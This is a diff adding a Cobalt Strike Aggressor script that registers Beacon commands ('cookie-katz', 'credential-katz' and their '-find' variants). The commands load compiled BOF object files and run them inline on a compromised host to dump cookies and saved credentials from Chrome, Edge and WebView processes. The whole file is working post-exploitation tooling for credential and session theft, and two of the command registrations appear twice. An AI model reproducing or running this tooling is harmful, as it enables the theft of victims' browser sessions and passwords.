@@ -1,0 +1,190 @@
+debug(5);
+
+beacon_command_register(
+   "cookie-katz",
+   "Dump cookies from Chrome or Edge",
+   "Dump cookies from Chrome or Edge\n\nUse: cookie-katz [chrome|edge|webview] [pid]"
+);
+
+beacon_command_register(
+   "cookie-katz-find",
+   "Find processes for cookie-katz",
+   "Find processes for cookie-katz\n\nUse: cookie-katz-find [chrome|edge|webview]"
+);
+
+beacon_command_register(
+   "credential-katz",
+   "Dump credential manager from Chrome or Edge",
+   "Dump credential manager from Chrome or Edge\n\nUse: credential-katz [chrome|edge] [pid]"
+);
+
+beacon_command_register(
+   "credential-katz-find",
+   "Find processes for credential-katz",
+   "Find processes for credential-katz\n\nUse: credential-katz-find [chrome|edge]"
+);
+
+alias cookie-katz {
+    local('$bid $browser $pid $pidStr $handle $data $args $path');
+    if (size(@_) != 3) {
+        berror($1, "Use: [chrome|edge|webview] [pid]");
+        return;
+    }
+    else if (barch($1) eq "x86") {
+        berror($1, "Not a x64 beacon!");
+        return;
+    }
+
+    # Check arguments
+    ($bid, $browser, $pidStr) = @_;
+    if ($browser !in @("chrome", "edge", "webview")) {
+        berror($1, "Unsupported browser: '$browser $+ '");
+        return;
+    }
+
+    $pid = [Integer parseInt: $pidStr];
+    if ($pid is $null) {
+        berror($1, "Could not parse pid '$pidStr $+ '");
+        return;
+    }
+
+    # Read the BOF
+    $path = getFileProper(script_resource(""), "release", "CookieKatzBOF.x64.o");
+    if (!-isFile $path) {
+        berror($1, "$path does not exist");
+        return;
+    }
+    $handle = openf($path);
+    $data = readb($handle, -1);
+    closef($handle);
+
+    # Pack our arguments
+    $args   = bof_pack($1, "zi", "/$browser", $pid);
+
+    # Execute it
+    beacon_inline_execute($1, $data, "go", $args);
+}
+
+alias cookie-katz-find {
+    local('$bid $browser $handle $data $args $path');
+    if (size(@_) != 2) {
+        berror($1, "Use: [chrome|edge|webview]");
+        return;
+    }
+    else if (barch($1) eq "x86") {
+        berror($1, "Not a x64 beacon!");
+        return;
+    }
+
+    # Check arguments
+    ($bid, $browser) = @_;
+    if ($browser !in @("chrome", "edge", "webview")) {
+        berror($1, "Unsupported browser: '$browser $+ '");
+        return;
+    }
+
+    # Read the BOF
+    $path = getFileProper(script_resource(""), "release", "ListChromeProcessCookies.x64.o");
+    if (!-isFile $path) {
+        berror($1, "$path does not exist");
+        return;
+    }
+    $handle = openf($path);
+    $data = readb($handle, -1);
+    closef($handle);
+
+    # Pack our arguments
+    $args   = bof_pack($1, "z", "/$browser");
+
+    # Execute it
+    beacon_inline_execute($1, $data, "go", $args);
+}
+
+
+beacon_command_register(
+   "credential-katz",
+   "Dump credential manager from Chrome or Edge",
+   "Dump credential manager from Chrome or Edge\n\nUse: credential-katz [chrome|edge] [pid]"
+);
+
+beacon_command_register(
+   "credential-katz-find",
+   "Find processes for credential-katz",
+   "Find processes for credential-katz\n\nUse: credential-katz-find [chrome|edge]"
+);
+
+alias credential-katz {
+    local('$bid $browser $pid $pidStr $handle $data $args $path');
+    if (size(@_) != 3) {
+        berror($1, "Use: [chrome|edge] [pid]");
+        return;
+    }
+    else if (barch($1) eq "x86") {
+        berror($1, "Not a x64 beacon!");
+        return;
+    }
+
+    # Check arguments
+    ($bid, $browser, $pidStr) = @_;
+    if ($browser !in @("chrome", "edge")) {
+        berror($1, "Unsupported browser: '$browser $+ '");
+        return;
+    }
+
+    $pid = [Integer parseInt: $pidStr];
+    if ($pid is $null) {
+        berror($1, "Could not parse pid '$pidStr $+ '");
+        return;
+    }
+
+    # Read the BOF
+    $path = getFileProper(script_resource(""), "release", "CredentialKatzBOF.x64.o");
+    if (!-isFile $path) {
+        berror($1, "$path does not exist");
+        return;
+    }
+    $handle = openf($path);
+    $data = readb($handle, -1);
+    closef($handle);
+
+    # Pack our arguments
+    $args   = bof_pack($1, "zi", "/$browser", $pid);
+
+    # Execute it
+    beacon_inline_execute($1, $data, "go", $args);
+}
+
+alias credential-katz-find {
+    local('$bid $browser $handle $data $args $path');
+    if (size(@_) != 2) {
+        berror($1, "Use: [chrome|edge]");
+        return;
+    }
+    else if (barch($1) eq "x86") {
+        berror($1, "Not a x64 beacon!");
+        return;
+    }
+
+    # Check arguments
+    ($bid, $browser) = @_;
+    if ($browser !in @("chrome", "edge")) {
+        berror($1, "Unsupported browser: '$browser $+ '");
+        return;
+    }
+
+    # Read the BOF
+    $path = getFileProper(script_resource(""), "release", "ListChromeProcessCredential.x64.o");
+    if (!-isFile $path) {
+        berror($1, "$path does not exist");
+        return;
+    }
+    $handle = openf($path);
+    $data = readb($handle, -1);
+    closef($handle);
+
+    # Pack our arguments
+    $args   = bof_pack($1, "z", "/$browser");
+
+    # Execute it
+    beacon_inline_execute($1, $data, "go", $args);
+}
